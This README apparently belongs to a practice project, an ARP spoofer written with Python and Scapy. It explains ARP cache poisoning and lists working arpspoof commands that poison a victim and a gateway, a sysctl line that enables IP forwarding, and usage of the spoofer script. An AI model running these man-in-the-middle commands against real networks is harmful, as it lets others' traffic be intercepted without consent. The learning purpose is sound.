# ARP Spoofer

ARP spoofing, ARP cache poisoning, or ARP poison routing, is a technique by which an attacker sends an ARP request to a device on a local area network, associating its MAC address with the IP addresses of other devices. 
Most likely this includes the default router or gateway, causing any traffic from the local network meant for it to be sent to the attacker instead.

There are many existing tools, like `arpspoof` that can do this.

From the hacking machine to the victim machine:

```shell
$ sudo arpspoof -i eth0 -t 192.168.122.75 192.168.122.1
```

and to the router:

```shell
$ sudo arpspoof -i eth0 -t 192.168.122.1 192.168.122.75
```

and setting enabling forward (not persistent) on the hacking machine:

```shell
$ sudo sysctl -w net.ipv4.ip_forward=1
```

And programming such an ARP Spoofer is excellent practice.

## Requirements

* Root access
* Python 3
* Scapy

## Usage

```shell
usage: arp_spoofer.py [-h] [-t TARGET_IP] [-s SPOOF_IP]
```

Example:

```shell
$ sudo sysctl -w net.ipv4.ip_forward=1
$ sudo python3 arp_spoofer.py -t 192.168.122.75 -s 192.168.122.1
```